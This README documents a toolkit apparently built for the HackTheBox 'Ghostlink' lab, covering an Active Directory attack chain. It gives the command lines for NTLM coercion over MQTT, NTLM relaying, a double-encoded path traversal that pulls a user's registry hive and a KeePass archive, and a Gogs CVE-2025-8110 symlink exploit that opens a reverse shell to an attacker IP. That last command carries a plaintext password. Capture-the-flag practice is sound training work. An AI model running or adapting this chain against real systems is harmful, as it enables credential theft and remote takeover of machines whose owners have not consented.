# 👻 Ghostlink Exploit Toolkit (`/autosolve/Ghostlink_scripts`)

A modular exploit and automation suite developed for the **HackTheBox - Ghostlink** machine (Windows Active Directory / Hard).

Full technical writeup: [Ghostlink - HackTheBox Machine Writeup](https://asbawy.com/writeups/htb-ghostlink)

---

## 📂 Toolkit Inventory

| File | Language | Primary Function & Attack Vector |
| :--- | :---: | :--- |
| **[`mqtt_trigger.py`](./mqtt_trigger.py)** | `Python 3` | Publishes a modified telemetry JSON payload over MQTT (`1883/tcp`) to coerce NTLM authentication from `svc_canary`. |
| **[`relay_bridge.py`](./relay_bridge.py)** | `Python 3` | Custom Impacket `ntlmrelayx` HTTP attack plugin that serializes relayed requests through a local HTTP proxy (`127.0.0.1:18080`) to eliminate SOCKS socket desync. |
| **[`traversal_fetch.py`](./traversal_fetch.py)** | `Python 3` | Abuses double URL-encoded path traversal (`%252e%252e%255c`) on the secureshare `/api/download` endpoint to extract arbitrary files as `svc_canary`. |
| **[`hive_inspect.py`](./hive_inspect.py)** | `Python 3` | Parses the exfiltrated `ntuser.dat` registry hive to extract `RecentDocs`, `ComDlg32`, and `TypedPaths` history for artifact discovery. |
| **[`gogs_symlink_rce.py`](./gogs_symlink_rce.py)** | `Python 3` | End-to-end exploit for **CVE-2025-8110** on Gogs 0.13.3. Uses `vroth` credentials to create a repo, commit a `.git/config` symlink, overwrite `core.sshCommand`, and trigger a reverse shell. |
| **[`cve2025_8110_ref.py`](./cve2025_8110_ref.py)** | `Python 3` | Standalone reference exploit by zAbuQasem for Gogs CVE-2025-8110 featuring automatic user registration, CSRF extraction, and proxying support. |

---

## 🚀 Execution & Exploitation Workflow

### Phase 1: MQTT Discovery & Coercion

```bash
# 1. Listen for inbound NTLM auth or relay
python3 mqtt_trigger.py http://10.10.15.187/
```

### Phase 2: NTLM Relay Bridge (Zero Socket Desync)

Copy `relay_bridge.py` into your Impacket installation directory (`impacket/examples/ntlmrelayx/attacks/httpattacks/`):

```bash
ntlmrelayx.py -t http://gpz-op26-secure.ghostlink.htb --http-port 8888 \
    --no-smb-server --no-rdp-server --no-mssql-server --no-rpc-server \
    --keep-relaying
```

### Phase 3: Double URL-Encoded Traversal File Fetcher

```bash
# Download win.ini to test traversal
python3 traversal_fetch.py '..\..\..\..\..\..\..\windows\win.ini'

# Exfiltrate user registry hive
python3 traversal_fetch.py '..\..\..\..\..\..\..\Users\svc_canary\ntuser.dat' loot/ntuser.dat

# Download KeePass bundle
python3 traversal_fetch.py '..\..\Documents\Operations\Management\db.zip' loot/db.zip
```

### Phase 4: Registry Forensics

```bash
python3 hive_inspect.py loot/ntuser.dat
```

### Phase 5: Gogs Symlink RCE (CVE-2025-8110)

```bash
python3 gogs_symlink_rce.py \
    -u http://gpz-op26-toolkits.ghostlink.htb \
    -U vroth \
    -P 'mOo03jpsqx8JQYMBwvFP' \
    -H 10.10.15.187 \
    -p 9002
```

---

## 🛠️ Requirements & Dependencies

```bash
pip3 install paho-mqtt impacket python-registry requests beautifulsoup4 rich pykeepass
```
